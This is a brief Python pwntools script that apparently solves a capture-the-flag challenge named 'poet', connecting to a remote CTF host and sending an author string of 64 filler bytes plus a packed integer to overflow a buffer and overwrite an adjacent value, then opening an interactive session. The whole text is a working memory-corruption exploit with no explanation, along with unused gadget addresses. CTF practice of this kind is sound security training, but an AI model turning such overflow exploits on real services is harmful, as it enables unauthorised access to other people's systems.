from pwn import *

#context.arch = 'amd64'
#context.terminal=['tmux', 'splitw', '-h']
#p = process("./poet")
p = remote('ctf.j0n9hyun.xyz', 3012)
reward = 0x4007e6
pop_rdi = 0x400ab3
#gdb.attach(p, 'b*0x04009c9')

print p.recvuntil("> ")
poem = "ESPR"
p.sendline(poem)
print p.recvuntil("> ")
author = "A"*64 + p64(999900)
p.sendline(author)
p.interactive()